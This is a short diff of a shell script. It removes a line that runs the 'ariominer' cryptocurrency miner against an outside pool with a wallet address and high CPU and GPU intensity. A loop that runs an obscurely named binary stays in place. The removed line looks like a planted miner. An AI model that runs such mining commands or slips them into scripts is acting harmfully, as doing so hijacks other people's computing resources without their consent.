@@ -79,5 +79,3 @@ do
 ./linux848888888874 linux8474
 
 done
-
-./ariominer --mode miner --pool http://www.blueinc.cloud --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux8474 --cpu-intensity 82 --gpu-intensity-cblocks 98 --gpu-intensity-gblocks 98
